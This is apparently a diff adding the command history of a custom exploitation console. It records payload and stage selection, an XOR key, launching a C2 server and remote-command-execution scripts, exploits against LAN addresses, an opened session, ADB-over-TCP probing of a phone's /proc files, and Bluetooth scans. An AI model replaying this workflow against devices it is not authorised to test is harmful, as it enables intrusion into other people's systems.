+# 2026-06-09 18:01:45.450628
++set LISTENER false
+
+# 2026-06-09 18:01:47.090691
++ls
+
+# 2026-06-09 18:01:48.426728
++clear
+
+# 2026-06-09 18:01:50.202497
++show
+
+# 2026-06-09 18:01:54.394862
++show details
+
+# 2026-06-09 18:02:21.436041
++search payloads
+
+# 2026-06-09 18:02:27.570875
++use payload 1
+
+# 2026-06-09 18:02:35.924509
++use payload 6
+
+# 2026-06-09 18:02:43.412796
++use stage2 1
+
+# 2026-06-09 18:02:46.106482
++show
+
+# 2026-06-09 18:02:56.493118
++clear
+
+# 2026-06-09 18:03:07.669547
++search recon
+
+# 2026-06-09 18:03:20.397670
++use recon 4
+
+# 2026-06-09 18:03:22.065735
++run
+
+# 2026-06-09 18:03:38.566802
++ip addr
+
+# 2026-06-09 18:03:50.991224
++exploit
+
+# 2026-06-09 18:04:14.936153
++set AUTO_ENUM false
+
+# 2026-06-09 18:04:17.192760
++shw
+
+# 2026-06-09 18:04:19.312490
++show
+
+# 2026-06-09 18:04:26.448370
++clear
+
+# 2026-06-09 18:05:32.130719
++ls source/tools/crytpography
+
+# 2026-06-09 18:05:49.475481
++ls source/tools/
+
+# 2026-06-09 18:05:53.395222
++cd ss
+
+# 2026-06-09 18:05:54.731733
++ls source/tools/
+
+# 2026-06-09 18:06:02.484604
++ls source/tools/cryptography
+
+# 2026-06-09 18:07:28.615081
++python3 source/tools/cryptography/xor_encrypter.py
+
+# 2026-06-09 18:10:59.127087
++cd ss
+
+# 2026-06-09 18:11:04.095197
++cd .data/test
+
+# 2026-06-09 18:11:05.775105
++show
+
+# 2026-06-09 18:14:29.206683
++python3 ~/test.py
+
+# 2026-06-09 18:14:54.336268
++python3 /home/donald/test.py
+
+# 2026-06-09 18:19:43.266228
++clear
+
+# 2026-06-09 18:25:47.295341
++python3 /home/donald/test.py
+
+# 2026-06-09 18:27:28.466488
++clear
+
+# 2026-06-09 18:27:30.467316
++python3 /home/donald/test.py
+
+# 2026-06-09 19:06:44.881539
++clear
+
+# 2026-06-09 19:06:49.105182
++python3 /home/donald/test.py
+
+# 2026-06-09 19:06:51.773910
++clear
+
+# 2026-06-09 19:06:54.562462
++python3 /home/donald/test.py
+
+# 2026-06-09 19:07:16.338613
++clear
+
+# 2026-06-09 19:07:43.915391
++python3 source/tools/cryptography/xor_encrypter.py
+
+# 2026-06-09 19:08:34.797858
++python3 source/tools/c2/c2_server.py
+
+# 2026-06-09 19:08:42.893886
++cd ss
+
+# 2026-06-09 19:08:43.869826
++python3 source/tools/c2/c2_server.py
+
+# 2026-06-09 19:09:08.086952
++cd .data/test
+
+# 2026-06-09 19:09:12.450920
++cd ss
+
+# 2026-06-09 19:09:14.332974
++cd .data/test
+
+# 2026-06-09 19:09:23.960050
++python3 remote_command_execution_test.py
+
+# 2026-06-09 19:20:55.553003
++show
+
+# 2026-06-09 19:29:23.135553
++set XOR_KEY SuperSploitKey
+
+# 2026-06-09 19:29:25.323299
++show
+
+# 2026-06-09 19:29:32.083516
++clear
+
+# 2026-06-09 19:29:33.867513
++show
+
+# 2026-06-09 19:29:38.278860
++help vars
+
+# 2026-06-09 19:36:53.195774
++clear
+
+# 2026-06-09 19:36:54.255747
++help vars
+
+# 2026-06-09 19:41:53.166411
++clear
+
+# 2026-06-09 19:42:32.697174
++python3 source/tools/c2/c2_server.py
+
+# 2026-06-09 19:42:36.976401
++cd ss
+
+# 2026-06-09 19:42:38.031591
++python3 source/tools/c2/c2_server.py
+
+# 2026-06-09 19:42:46.520586
++show
+
+# 2026-06-09 19:42:52.549523
++set XOR_KEY SuperSploitKey
+
+# 2026-06-09 19:43:03.017722
++clear
+
+# 2026-06-09 19:49:06.394042
++exploit
+
+# 2026-06-09 19:49:51.913306
++clear
+
+# 2026-06-09 19:55:35.260672
++clea
+
+# 2026-06-09 19:55:37.253973
++clear
+
+# 2026-06-09 19:55:41.699062
++show
+
+# 2026-06-09 19:55:45.113679
++jobs
+
+# 2026-06-09 19:55:52.528362
++help jobs
+
+# 2026-06-09 19:55:58.247132
++jobs kill 1
+
+# 2026-06-09 19:56:01.654174
++clear
+
+# 2026-06-09 19:56:08.480563
++exploit
+
+# 2026-06-09 19:56:50.776192
++clear
+
+# 2026-06-09 19:56:52.906110
++jobs
+
+# 2026-06-09 20:00:56.034849
++set target 192.168.191.231
+
+# 2026-06-09 20:01:06.175425
++set target 192.168.71.231
+
+# 2026-06-09 20:01:59.180978
++exit
+
+# 2026-06-09 20:02:19.236361
++cd ss
+
+# 2026-06-09 20:02:37.726510
++cd .data/test && python3 remote_command_execution.py
+
+# 2026-06-09 20:02:49.678957
++ls .data/test
+
+# 2026-06-09 20:02:51.231398
++ls .data/tests
+
+# 2026-06-09 20:03:01.407552
++cd .data/test
+
+# 2026-06-09 20:03:06.415578
++cd ss
+
+# 2026-06-09 20:03:13.799829
++cd .data/tests && python3 remote_command_execution.py
+
+# 2026-06-09 20:03:17.087986
++ls
+
+# 2026-06-09 20:03:20.440321
++ls .data/tests
+
+# 2026-06-09 20:03:24.644377
++ls .data/test
+
+# 2026-06-09 20:03:30.897183
++cd .data/test && python3 remote_command_execution.py
+
+# 2026-06-09 20:03:33.663572
++ls
+
+# 2026-06-09 20:03:39.225672
++cd .data/test && python3 remote_command_execution_test.py
+
+# 2026-06-09 20:03:43.797158
++ls
+
+# 2026-06-09 20:03:50.553330
++python3 source/tools/c2/c2_server.py
+
+# 2026-06-09 20:04:01.977620
++clear
+
+# 2026-06-09 20:04:03.528271
++cd ss
+
+# 2026-06-09 20:04:11.714091
++python3 source/tools/c2/c2_server.py
+
+# 2026-06-09 20:04:29.578851
++exploit
+
+# 2026-06-09 20:05:29.349402
++clear
+
+# 2026-06-09 20:05:34.861034
++use stage2 0
+
+# 2026-06-09 20:05:38.541134
++exploit
+
+# 2026-06-09 20:06:32.375624
++clear
+
+# 2026-06-09 20:08:21.827254
++exit
+
+# 2026-06-09 20:08:28.522571
++exploit
+
+# 2026-06-09 20:09:01.676173
++clear
+
+# 2026-06-09 20:09:04.124833
++exploit
+
+# 2026-06-09 20:09:18.597437
++show
+
+# 2026-06-09 20:12:40.340990
++cd ss
+
+# 2026-06-09 20:12:42.404646
++cd .data/test && python3 remote_command_execution_test.py
+
+# 2026-06-09 20:12:51.485894
++cd ss
+
+# 2026-06-09 20:12:55.081257
++python3 source/tools/c2/c2_server.py
+
+# 2026-06-09 20:13:39.102795
++exploit
+
+# 2026-06-09 20:14:06.881520
++set target 192.168.71.231
+
+# 2026-06-09 20:14:11.875845
++set target 0.0.0.0
+
+# 2026-06-09 20:14:15.960194
++exploit
+
+# 2026-06-09 20:14:38.056513
++sessions -i 1
+
+# 2026-06-09 21:03:32.367164
++show 
+
+# 2026-06-09 21:04:47.890644
++exploit
+
+# 2026-06-09 21:33:52.708652
++workspace use p55\
+
+# 2026-06-09 21:33:54.472906
++workspace use p55
+
+# 2026-06-09 21:33:56.485324
++clear
+
+# 2026-06-09 21:33:57.786442
++show
+
+# 2026-06-09 21:38:19.782057
++search profiles
+
+# 2026-06-09 21:38:37.154569
++import profile profiles/elite_p55_profile.md
+
+# 2026-06-09 21:38:48.513955
++cd ss
+
+# 2026-06-09 21:38:49.529792
++import profile profiles/elite_p55_profile.md
+
+# 2026-06-09 21:38:51.061960
++clear
+
+# 2026-06-09 21:38:57.785845
++use profile 0
+
+# 2026-06-09 21:39:00.322268
++show
+
+# 2026-06-09 21:39:03.946372
++show profile
+
+# 2026-06-09 21:42:55.781579
++adb devices
+
+# 2026-06-09 21:43:20.349758
++adb -s SKYP552006129833 tcpip 5555
+
+# 2026-06-09 21:44:10.030129
++adb connect 192.168.185.16
+
+# 2026-06-09 21:44:14.757621
++adb -s SKYP552006129833 tcpip 5555
+
+# 2026-06-09 21:44:16.229845
++adb connect 192.168.185.16
+
+# 2026-06-09 21:44:22.149520
++adb connect 192.168.185.75
+
+# 2026-06-09 21:51:10.863454
++adb -s SKYP552006129833 shell cat /proc/modules > p55_proc_read
+
+# 2026-06-09 21:51:25.317619
++cat p55_proc_read | more
+
+# 2026-06-09 21:51:55.625771
++clear
+
+# 2026-06-09 21:51:58.773708
++cat p55_proc_read | more
+
+# 2026-06-09 21:52:47.160607
++adb shell ls -al /proc | grep "rw-r"
+
+# 2026-06-09 21:53:17.441635
++adb -s SKYP552006129833 shell ls -al /proc | grep "rw-r"
+
+# 2026-06-09 21:53:34.130314
++adb -s SKYP552006129833 shell ls -al /proc > p55_procFolder
+
+# 2026-06-09 21:53:44.474701
++cat p55_procFolder | more
+
+# 2026-06-09 22:10:21.668014
++ls source/tools/android
+
+# 2026-06-09 22:10:25.103737
++ls source/tools/
+
+# 2026-06-09 22:11:49.680972
++ls source/tools/androidKernel
+
+# 2026-06-09 22:14:04.047506
++ls
+
+# 2026-06-09 22:14:10.862837
++ls source/tools/androidKenerel
+
+# 2026-06-09 22:14:14.654442
++ls source/tools/androidKenrel
+
+# 2026-06-09 22:14:17.326662
++ls source/tools/androidKenrle
+
+# 2026-06-09 22:14:22.406602
++ls source/tools/
+
+# 2026-06-09 22:14:29.726533
++ls source/tools/androidKernel
+
+# 2026-06-09 22:14:38.972690
++ls source/tools/AndroidKernel
+
+# 2026-06-09 22:14:44.354496
++clear
+
+# 2026-06-09 22:14:45.615844
++ls source/tools/AndroidKernel
+
+# 2026-06-09 22:15:12.857986
++python3 source/tools/AndroidKernel/adb_proc_dump.py
+
+# 2026-06-09 22:23:12.457277
++clear
+
+# 2026-06-09 22:23:13.585008
++python3 source/tools/AndroidKernel/adb_proc_dump.py
+
+# 2026-06-09 22:26:22.824797
++clear
+
+# 2026-06-09 22:26:24.219437
++python3 source/tools/AndroidKernel/adb_proc_dump.py
+
+# 2026-06-09 22:26:50.919945
++clear
+
+# 2026-06-09 22:26:51.884857
++python3 source/tools/AndroidKernel/adb_proc_dump.py
+
+# 2026-06-09 22:42:40.813426
++clear
+
+# 2026-06-09 22:42:42.019630
++python3 source/tools/AndroidKernel/adb_proc_dump.py
+
+# 2026-06-09 22:48:45.474437
++clear
+
+# 2026-06-09 22:48:46.774870
++python3 source/tools/AndroidKernel/adb_proc_dump.py
+
+# 2026-06-09 23:09:48.666484
++clear
+
+# 2026-06-09 23:09:52.650300
++search recon
+
+# 2026-06-09 23:09:57.368530
++use recon 0
+
+# 2026-06-09 23:09:59.225984
++run
+
+# 2026-06-09 23:15:32.030318
++sudo hcitool scan
+
+# 2026-06-09 23:15:47.022703
++run
+
+# 2026-06-09 23:19:25.082829
++set BT_SCAN_TIME 5
+
+# 2026-06-09 23:20:00.731015
++run
+
+# 2026-06-09 23:21:50.880212
++update-info
+
+# 2026-06-09 23:21:52.365859
++run
+
+# 2026-06-10 00:28:17.933271
++clear
+
+# 2026-06-10 00:28:19.792156
++run
+
+# 2026-06-10 00:29:32.738737
++sudo hcitool lescan
+
+# 2026-06-10 00:30:45.217542
++clear
